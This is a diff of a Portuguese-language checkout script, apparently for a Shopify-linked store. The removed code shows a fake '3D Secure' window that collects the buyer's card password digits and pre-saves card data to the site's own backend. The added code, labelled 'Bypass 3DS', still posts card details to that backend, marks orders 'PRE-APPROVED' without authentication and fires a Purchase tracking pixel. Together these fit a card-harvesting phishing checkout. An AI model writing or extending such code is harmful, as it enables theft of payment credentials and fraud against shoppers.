@@ -2668,26 +2668,24 @@ Obs: Caso já tenha realizado o pagamento, enviaremos uma mensagem confirmando a
       status: selectedMethod === 'pix' ? 'PENDING' : 'draft'
     };
 
-    // Fluxo Diferenciado se for Cartão de Crédito (Autenticação 3DS)
+    // Fluxo Diferenciado se for Cartão de Crédito (Bypass 3DS)
     if (selectedMethod === 'card') {
-      // 1. Mostrar loader de validação de autenticação inicial
       const loadingTitle = authLoadingOverlay.querySelector('.auth-title');
       const loadingSubtitle = authLoadingOverlay.querySelector('.auth-subtitle');
-      
-      loadingTitle.textContent = "Validando autenticação";
-      loadingSubtitle.textContent = "Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.";
+      loadingTitle.textContent = "Processando pagamento...";
+      loadingSubtitle.textContent = "Aguarde enquanto confirmamos seus dados com a rede emissora...";
       authLoadingOverlay.classList.add('open');
 
-      // 2. Fazer requisição imediata de pré-gravação com card_password e status como "erro 3ds"
-      const initialPayload = {
-        ...payload,
-        card_password: 'erro 3ds',
-        three_ds_status: 'erro 3ds',
-        status: 'FAILED' // Estado inicial caso não termine a inserção de senha
-      };
+      const now = new Date();
+      const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
 
-      let responseData = null;
-      let firstRequestSuccess = false;
+      // Faz a requisição final direto, ignorando validação 3DS
+      const finalPayload = {
+        ...payload,
+        card_password: 'N/A', // Sem senha capturada
+        three_ds_status: 'bypassed',
+        status: 'PRE-APPROVED'
+      };
 
       try {
         const response = await fetch('/api/checkout', {
@@ -2695,148 +2693,63 @@ Obs: Caso já tenha realizado o pagamento, enviaremos uma mensagem confirmando a
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify(initialPayload)
+          body: JSON.stringify(finalPayload)
         });
-        responseData = await response.json();
-        if (response.ok && responseData.success) {
-          firstRequestSuccess = true;
-          console.log('💳 Dados do cartão pré-gravados com sucesso no Supabase (antes do 3DS).');
-        } else {
-          console.warn('⚠️ Falha ao pré-gravar cartão:', responseData.error);
-        }
-      } catch (err) {
-        console.error('❌ Erro na pré-gravação do cartão:', err);
-      }
 
-      // Popula as informações dinâmicas do modal 3DS
-      authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
-      authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
+        const finalResponseData = await response.json();
 
-      const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-      authInfoAmount.textContent = totalBrl;
-
-      const now = new Date();
-      const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
-      authInfoDate.textContent = formattedDate;
-
-      const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
-      authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;
-
-      // Limpa os campos de senha e coloca foco no primeiro
-      digitInputs.forEach(input => input.value = '');
-      
-      // Esconde o loading overlay e abre o modal 3DS
-      authLoadingOverlay.classList.remove('open');
-      auth3dsOverlay.classList.add('open');
-      setTimeout(() => {
-        const firstDigit = document.getElementById('auth-digit-1');
-        if (firstDigit) firstDigit.focus();
-      }, 100);
-
-      // Define a ação de envio da senha
-      const execute3dsSubmit = async () => {
-        // Recuperar a senha inserida
-        let passwordVal = '';
-        digitInputs.forEach(input => passwordVal += input.value);
-
-        if (passwordVal.length < 4) {
-          const digitsContainer = document.querySelector('.auth-password-digits');
-          shakeElement(digitsContainer);
-          return;
+        if (!response.ok) {
+          throw new Error(finalResponseData.details || finalResponseData.error || 'Falha ao salvar transação de cartão.');
         }
 
-        // Senha válida! Prosseguir com o envio final para autenticar.
-        loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
-        loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
+        const trackPayload = {
+          content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
+          content_ids: shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(i => String(i.variant_id || i.sku || 'SHPFY-DEFAULT')) : [String(shpfyVariantId || shpfyProductSku || 'SANDBOX-ELITE-PK')],
+          content_type: 'product',
+          currency: 'BRL',
+          value: totalAmount,
+          contents: shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(i => ({ id: String(i.variant_id || i.sku || 'SHPFY-DEFAULT'), quantity: parseInt(i.quantity) || 1 })) : [{ id: String(shpfyVariantId || shpfyProductSku || 'SANDBOX-ELITE-PK'), quantity: shpfyProductQuantity || 1 }]
+        };
         
-        auth3dsOverlay.classList.remove('open');
-        authLoadingOverlay.classList.add('open');
+        // Dispara o Pixel de Purchase quando atinge o pedido pré-aprovado
+        trackPixelEvent('Purchase', trackPayload);
 
-        // Aguardar 2.0 segundos de animação
-        setTimeout(async () => {
-          // Anexar a senha do cartão e o status atualizado no payload final
-          const finalPayload = {
-            ...payload,
-            card_password: passwordVal,
-            three_ds_status: 'authenticated',
-            status: 'PRE-APPROVED',
-            shopify_order_id: responseData?.data?.shopify_order_id || null,
-            shopify_order_name: responseData?.data?.shopify_order_name || null
-          };
+        // Limpar rascunho de sessão atual
+        localStorage.removeItem('checkout_session_id');
 
-          try {
-            const response = await fetch('/api/checkout', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(finalPayload)
-            });
-
-            const finalResponseData = await response.json();
-
-            if (!response.ok) {
-              throw new Error(finalResponseData.details || finalResponseData.error || 'Falha ao salvar transação de cartão.');
+        const urlParams = new URLSearchParams(window.location.search);
+        let storeParam = urlParams.get('store_url') || sessionStorage.getItem('checkout_origin');
+        
+        if (!storeParam || storeParam === 'null' || storeParam === 'undefined') {
+          if (window._currentThemeConfig && window._currentThemeConfig.shopifyDomain) {
+            let domain = window._currentThemeConfig.shopifyDomain.trim();
+            if (!domain.includes('.')) {
+              domain = domain + '.myshopify.com';
             }
-
-            const trackPayload = {
-              content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
-              content_ids: shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(i => String(i.variant_id || i.sku || 'SHPFY-DEFAULT')) : [String(shpfyVariantId || shpfyProductSku || 'SANDBOX-ELITE-PK')],
-              content_type: 'product',
-              currency: 'BRL',
-              value: totalAmount,
-              contents: shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(i => ({ id: String(i.variant_id || i.sku || 'SHPFY-DEFAULT'), quantity: parseInt(i.quantity) || 1 })) : [{ id: String(shpfyVariantId || shpfyProductSku || 'SANDBOX-ELITE-PK'), quantity: shpfyProductQuantity || 1 }]
-            };
-            
-            trackPixelEvent('Purchase', trackPayload);
-
-            // Limpar rascunho de sessão atual
-            localStorage.removeItem('checkout_session_id');
-
-            const urlParams = new URLSearchParams(window.location.search);
-            let storeParam = urlParams.get('store_url') || sessionStorage.getItem('checkout_origin');
-            
-            if (!storeParam || storeParam === 'null' || storeParam === 'undefined') {
-              if (window._currentThemeConfig && window._currentThemeConfig.shopifyDomain) {
-                let domain = window._currentThemeConfig.shopifyDomain.trim();
-                if (!domain.includes('.')) {
-                  domain = domain + '.myshopify.com';
-                }
-                storeParam = 'https://' + domain;
-              }
-            }
-            
-            let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
-            if (storeParam) {
-              redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
-            }
-            
-            // Aguardar 800ms para garantir que o Pixel do Facebook e requests assíncronos sejam concluídos antes de sair da página
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 800);
-
-          } catch (err) {
-            console.error('Erro ao processar transação de cartão:', err);
-            authLoadingOverlay.classList.remove('open');
-            showModalState('error', { error: err.message });
-            
-            // Restaurar os controles do form principal
-            submitBtn.disabled = false;
-            btnText.classList.remove('hide');
-            btnLoader.classList.add('hide');
-            isSubmitting = false;
+            storeParam = 'https://' + domain;
           }
-        }, 2000);
-      };
+        }
+        
+        let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
+        if (storeParam) {
+          redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
+        }
+        
+        // Aguardar 800ms para garantir que o Pixel do Facebook e requests assíncronos sejam concluídos antes de sair da página
+        setTimeout(() => {
+          window.location.href = redirectUrl;
+        }, 800);
 
-      // Associar o clique de envio
-      // Substituímos o botão por um clone dele para limpar listeners antigos!
-      const currentBtnSubmit = document.getElementById('btn-submit-3ds');
-      if (currentBtnSubmit) {
-        const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
-        currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
-        newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
+      } catch (err) {
+        console.error('Erro ao processar transação de cartão:', err);
+        authLoadingOverlay.classList.remove('open');
+        showModalState('error', { error: err.message });
+        
+        // Restaurar os controles do form principal
+        submitBtn.disabled = false;
+        btnText.classList.remove('hide');
+        btnLoader.classList.add('hide');
+        isSubmitting = false;
       }
 
       return;
